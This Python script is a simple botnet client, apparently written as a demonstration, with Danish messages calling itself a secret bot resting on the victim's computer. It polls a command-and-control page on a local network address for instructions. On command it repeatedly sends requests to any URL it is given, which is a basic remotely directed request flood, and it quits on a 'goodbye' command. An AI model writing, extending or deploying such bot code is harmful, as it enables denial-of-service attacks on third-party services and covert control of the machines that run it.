import requests
import re
import time

# URL to poll
command_url = "http://192.168.1.104:5000/"

# Keep track of the last processed command to avoid repeating commands.
last_command = None

print("Dette er en super hemmelig bot, der bare ligger og hygger sig på din computer.")
print("Waiting for command server", end="")

def process_command(command):
    """Process the received command."""
    call_match = re.match(r'^call\((\d+)\):\s*(.+)$', command, re.IGNORECASE)
    if call_match:
        count = int(call_match.group(1))
        url = call_match.group(2).strip()
        print(f"\nCalling {url} {count} times")
        for i in range(count):
            try:
                resp = requests.get(url)
                print(f"Request {i+1}/{count}: Status code {resp.status_code}")
                #time.sleep(0.7)
            except requests.exceptions.RequestException as e:
                print(f"Request {i+1}/{count} failed: {e}")
    elif command.lower() == "goodbye":
        start_time = time.time()
        while time.time() - start_time < 3:
            print("Goodbye, and thanks for all the fish")
            time.sleep(0.2)
        exit(0)
    elif command.lower() == "No current command":
        print(".", end="", flush=True)
    else:
        print("\nCommand not recognized.")
        print("Waiting for command server", end="")

while True:
    try:
        print(".", end="", flush=True)  # Print a dot for each attempt
        response = requests.get(command_url, timeout=5)  
        response.raise_for_status()  
        html_text = response.text
        regex_pattern = r'<div\s+id\s*=\s*["\']latestcommand["\']\s*>(.*?)</div>'
        match = re.search(regex_pattern, html_text, re.IGNORECASE | re.DOTALL)
        if match:
            command = match.group(1).strip()
            if command and command != last_command:
                print(f"\nNew command received: {command}")
                process_command(command)
                last_command = command
        else:
            print("No command found in the page.")
    except requests.exceptions.ConnectionError:
        pass  # Just print the dots, no error message
    except requests.exceptions.Timeout:
        pass  # Ignore timeout errors, just print the dots
    except requests.exceptions.RequestException:
        pass  # Ignore any other request issues, keep waiting
    time.sleep(3)
